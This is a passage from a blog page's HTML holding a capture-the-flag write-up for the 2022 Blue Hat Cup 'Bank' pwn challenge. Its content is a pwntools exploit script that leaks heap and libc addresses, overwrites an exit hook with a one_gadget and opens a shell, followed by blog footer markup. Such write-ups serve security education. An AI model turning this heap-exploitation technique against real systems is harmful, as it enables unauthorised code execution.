class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'Login'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Card Numbers: '</span>, <span class="built_in">str</span>(<span class="number">123</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Password: '</span>, <span class="built_in">str</span>(<span class="number">123123</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'Info'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Put</span>(<span class="params">money</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'Put'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'How Much? '</span>, <span class="built_in">str</span>(money))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Deposit</span>(<span class="params">money</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'Deposit'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'How Much? '</span>, <span class="built_in">str</span>(money))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">money</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'Transfer'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'who? '</span>, <span class="string">'admin'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'How much? '</span>, <span class="built_in">str</span>(money))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hacker</span>(<span class="params">addr</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'Transfer'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'who? '</span>, <span class="string">'hacker'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'How much? '</span>, <span class="built_in">str</span>(<span class="number">0x33</span>))</span><br><span class="line">    r.sendline(addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guest</span>(<span class="params">data</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'Transfer'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'who? '</span>, <span class="string">'guest'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'How much? '</span>, <span class="built_in">str</span>(<span class="number">0x6</span>))</span><br><span class="line">    r.sendafter(<span class="string">'data: '</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ghost</span>(<span class="params">size</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'Transfer'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'who? '</span>, <span class="string">'ghost'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'How much? '</span>, <span class="built_in">str</span>(<span class="number">0xb</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'ghost: &amp;^%$#@!   :)'</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">abyss</span>(<span class="params">addr</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'Transfer'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'who? '</span>, <span class="string">'abyss'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'How much? '</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    r.sendline(addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">login()</span><br><span class="line">Put(<span class="number">0x190</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap_base</span></span><br><span class="line">guest(p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>))</span><br><span class="line">ghost(<span class="number">0x80</span>)</span><br><span class="line">guest(<span class="string">'aaaa'</span>)</span><br><span class="line">ghost(<span class="number">0x90</span>)</span><br><span class="line">guest(<span class="string">'bbbb'</span>)</span><br><span class="line">ghost(<span class="number">0xf0</span>)</span><br><span class="line">admin(<span class="number">0x1f</span>)</span><br><span class="line">r.recvuntil(<span class="string">'I think '</span>)</span><br><span class="line">heap_base = <span class="built_in">int</span>(r.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0x10</span></span><br><span class="line">li(<span class="string">'heap_base = '</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">ghost(<span class="number">0x30</span>)</span><br><span class="line">ghost(<span class="number">0xf0</span>)</span><br><span class="line">guest(<span class="string">'cccc'</span>)</span><br><span class="line">guest(p64(<span class="number">0x420</span>)+p64(<span class="number">0x31</span>))</span><br><span class="line">guest(p64(<span class="number">0x420</span>)+p64(<span class="number">0x31</span>))</span><br><span class="line">guest(p64(<span class="number">0x420</span>)+p64(<span class="number">0x31</span>))</span><br><span class="line">guest(p64(<span class="number">0x420</span>)+p64(<span class="number">0x31</span>))</span><br><span class="line">guest(p64(<span class="number">0x420</span>)+p64(<span class="number">0x31</span>))</span><br><span class="line">guest(<span class="string">'dddd'</span>)</span><br><span class="line">hacker(<span class="built_in">str</span>(heap_base + <span class="number">0x2d0</span>))</span><br><span class="line">ghost(<span class="number">0x30</span>)</span><br><span class="line">ghost(<span class="number">0xf0</span>)</span><br><span class="line">admin(<span class="number">0x26</span>)</span><br><span class="line">r.recvuntil(<span class="string">'I think '</span>)</span><br><span class="line">malloc_hook = <span class="built_in">int</span>(r.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line">li(<span class="string">'malloc_hook = '</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.31.so'</span>)</span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">li(<span class="string">'libc_base = '</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">exit_hook = libc_base + <span class="number">0x222f68</span></span><br><span class="line">li(<span class="string">'exit_hook = '</span> + <span class="built_in">hex</span>(exit_hook))</span><br><span class="line"></span><br><span class="line">hacker(<span class="built_in">str</span>(heap_base + <span class="number">0x2a0</span>))</span><br><span class="line">guest(p64(exit_hook))</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0xe6c7e</span>, <span class="number">0xe6c81</span>, <span class="number">0xe6c84</span>]</span><br><span class="line">one_gadget = one[<span class="number">0</span>] + libc_base</span><br><span class="line"></span><br><span class="line">abyss(<span class="built_in">str</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>
+</font>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp"><span class="toc-number">1.</span> <span class="toc-text">2022蓝帽杯初赛 pwn wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%93%9D%E5%B8%BD%E6%9D%AF2022-pwn-escape-shellcode"><span class="toc-number">1.1.</span> <span class="toc-text">蓝帽杯2022 pwn escape_shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%93%9D%E5%B8%BD%E6%9D%AF2022-pwn-Bank"><span class="toc-number">1.2.</span> <span class="toc-text">蓝帽杯2022 pwn Bank</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp/&amp;text=2022蓝帽杯初赛 pwn wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp/&amp;title=2022蓝帽杯初赛 pwn wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp/&amp;is_video=false&amp;description=2022蓝帽杯初赛 pwn wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2022蓝帽杯初赛 pwn wp&amp;body=Check out this article: http://example.com/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp/&amp;title=2022蓝帽杯初赛 pwn wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp/&amp;title=2022蓝帽杯初赛 pwn wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp/&amp;title=2022蓝帽杯初赛 pwn wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp/&amp;title=2022蓝帽杯初赛 pwn wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp/&amp;name=2022蓝帽杯初赛 pwn wp&amp;description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp/&amp;t=2022蓝帽杯初赛 pwn wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright ©
+    
+    
+    2021-2023
+    z1r0
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+
+<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
